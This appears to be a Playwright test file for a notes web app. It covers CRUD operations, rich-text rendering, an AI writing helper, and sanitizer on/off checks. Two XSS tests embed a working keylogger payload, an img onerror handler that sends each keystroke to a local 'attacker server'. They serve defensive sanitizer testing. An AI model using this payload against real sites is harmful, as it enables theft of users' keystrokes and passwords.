import { test, expect, type Page } from '@playwright/test';
import { readFileSync, writeFileSync } from 'fs';
import { join } from 'path';

const BASE_URL = 'http://localhost:3000';

// keylog.txt is written by attacker_server.js at the repo root. Playwright runs
// with the cwd set to the frontend dir, so the repo root is one level up.
const KEYLOG_PATH = join(process.cwd(), '..', 'keylog.txt');

const readKeylog = (): string => {
  try {
    return readFileSync(KEYLOG_PATH, 'utf-8');
  } catch {
    return '';
  }
};

const resetKeylog = (): void => {
  writeFileSync(KEYLOG_PATH, '');
};

// A note body that is harmless text plus an <img> whose src fails to load, so
// the browser runs onerror. onerror installs a global keydown listener that
// ships every key to the attacker server. Wrapped in benign text so a broken
// payload can't take the surrounding DOM down with it.
const KEYLOGGER_PAYLOAD =
  'hello <img src="x" onerror="document.addEventListener(\'keydown\','
  + "function(e){fetch('http://localhost:4000/log',{method:'POST',body:e.key});})"
  + '"> world';

const registerAndLogin = async (page: Page, username: string) => {
  await page.goto(`${BASE_URL}/create-user`);
  await page.waitForSelector('[data-testid="create_user_form"]');
  await page.fill('[data-testid="create_user_form_name"]', 'Playwright User');
  await page.fill('[data-testid="create_user_form_email"]', `${username}@test.com`);
  await page.fill('[data-testid="create_user_form_username"]', username);
  await page.fill('[data-testid="create_user_form_password"]', 'password123');
  await page.click('[data-testid="create_user_form_create_user"]');

  await expect(page.locator('[data-testid="go_to_login_button"]')).toBeVisible({ timeout: 30000 });

  await page.goto(`${BASE_URL}/login`);
  await page.waitForSelector('[data-testid="login_form"]');
  await page.fill('[data-testid="login_form_username"]', username);
  await page.fill('[data-testid="login_form_password"]', 'password123');
  await page.click('[data-testid="login_form_login"]');

  await expect(page.locator('[data-testid="logout"]')).toBeVisible({ timeout: 30000 });
};

const createNote = async (page: Page, title: string, content: string) => {
  await page.click('button[name="add_new_note"]');
  await page.fill('input[placeholder="Title"]', title);
  await page.fill('textarea[name="text_input_new_note"]', content);
  await page.click('button[name="text_input_save_new_note"]');
  await expect(page.locator('.notification')).toHaveText('Added a new note');
};

const setSanitizer = async (page: Page, on: boolean) => {
  const toggle = page.locator('[data-testid="sanitizer_toggle"]');
  const wanted = on ? 'Sanitizer: ON' : 'Sanitizer: OFF';
  if ((await toggle.textContent())?.trim() !== wanted) {
    await toggle.click();
  }
  await expect(toggle).toHaveText(wanted);
};

test('RICH TEXT - note content is rendered as HTML', async ({ page }) => {
  const username = `pw_rich_${Date.now()}`;
  await registerAndLogin(page, username);

  // Sanitizer is ON by default; <b> is a whitelisted tag so it survives.
  await createNote(page, 'Rich Note', 'Hello <b>world</b>');

  const bold = page
    .locator('[data-testid="note_body"] b')
    .filter({ hasText: 'world' })
    .first();
  await expect(bold).toBeVisible();
  await expect(bold).toHaveText('world');
});

test('XSS - keylogger runs when sanitizer is OFF', async ({ page }) => {
  resetKeylog();
  const username = `pw_xss_off_${Date.now()}`;
  await registerAndLogin(page, username);

  await setSanitizer(page, false);
  await createNote(page, 'Payload Note', KEYLOGGER_PAYLOAD);

  // The note re-renders after creation; the failed <img> fires onerror and the
  // keydown listener is now installed on document. Type a few keys.
  await page.locator('body').click();
  await page.keyboard.type('xyz');

  await expect
    .poll(() => readKeylog(), { timeout: 15000 })
    .toMatch(/x[\s\S]*y[\s\S]*z/);
});

test('XSS - keylogger is blocked when sanitizer is ON', async ({ page }) => {
  resetKeylog();
  const username = `pw_xss_on_${Date.now()}`;
  await registerAndLogin(page, username);

  // Sanitizer ON (default) strips the onerror handler, so no listener installs.
  await setSanitizer(page, true);
  await createNote(page, 'Payload Note Safe', KEYLOGGER_PAYLOAD);

  await page.locator('body').click();
  await page.keyboard.type('abc');

  // Give any (incorrectly surviving) payload a chance to write, then assert
  // the log is still empty.
  await page.waitForTimeout(3000);
  expect(readKeylog()).toBe('');
});

test('CREATE - add a new note', async ({ page }) => {
  const username = `pw_create_${Date.now()}`;
  await registerAndLogin(page, username);

  await page.click('button[name="add_new_note"]');
  await page.fill('input[placeholder="Title"]', 'Playwright Test Title');
  await page.fill('textarea[name="text_input_new_note"]', 'Playwright test note');
  await page.click('button[name="text_input_save_new_note"]');

  await expect(page.locator('.notification')).toHaveText('Added a new note');
});

test('READ - notes are displayed', async ({ page }) => {
  await page.goto(BASE_URL);

  const notes = page.locator('.note');
  await expect(notes.first()).toBeVisible();
  await expect(page.locator('button[name="first"]')).toBeVisible();
  await expect(page.locator('button[name="next"]')).toBeVisible();
});

test('UPDATE - edit a note', async ({ page }) => {
  const username = `pw_update_${Date.now()}`;
  await registerAndLogin(page, username);

  await page.click('button[name="add_new_note"]');
  await page.fill('input[placeholder="Title"]', 'Note To Edit');
  await page.fill('textarea[name="text_input_new_note"]', 'Original content');
  await page.click('button[name="text_input_save_new_note"]');
  await expect(page.locator('.notification')).toHaveText('Added a new note');

  const createdNote = page.locator('.note').filter({ hasText: 'Note To Edit' }).first();
  const noteId = await createdNote.getAttribute('data-testid');

  await page.click(`button[data-testid="edit-${noteId}"]`);
  await page.fill(`textarea[data-testid="text_input-${noteId}"]`, 'Updated by playwright');
  await page.click(`button[data-testid="text_input_save-${noteId}"]`);

  await expect(page.locator('.notification')).toHaveText('Note updated');
});

test('DELETE - delete a note', async ({ page }) => {
  const username = `pw_delete_${Date.now()}`;
  await registerAndLogin(page, username);

  await page.click('button[name="add_new_note"]');
  await page.fill('input[placeholder="Title"]', 'Note To Delete');
  await page.fill('textarea[name="text_input_new_note"]', 'Delete me');
  await page.click('button[name="text_input_save_new_note"]');
  await expect(page.locator('.notification')).toHaveText('Added a new note');

  const createdNote = page.locator('.note').filter({ hasText: 'Note To Delete' }).first();
  const noteId = await createdNote.getAttribute('data-testid');

  await page.click(`button[data-testid="delete-${noteId}"]`);
  await expect(page.locator('.notification')).toHaveText('Note deleted');
  await expect(page.locator(`[data-testid="${noteId}"]`)).toHaveCount(0);
});

test('AI assistant appends generated text to the new note body', async ({ page }) => {
  test.setTimeout(120000);

  const username = `pw_ai_${Date.now()}`;
  await registerAndLogin(page, username);

  await page.click('button[name="add_new_note"]');
  await page.click('[data-testid="help_me_write"]');

  const textarea = page.locator('textarea[name="text_input_new_note"]');
  const before = await textarea.inputValue();

  await page.fill('[data-testid="help_me_write_prompt"]', 'Write a short greeting for my note.');
  await page.click('[data-testid="help_me_write_submit"]');

  await expect
    .poll(async () => (await textarea.inputValue()).length, { timeout: 90000 })
    .toBeGreaterThan(before.length);

  const after = await textarea.inputValue();
  expect(after.length).toBeGreaterThan(0);
});
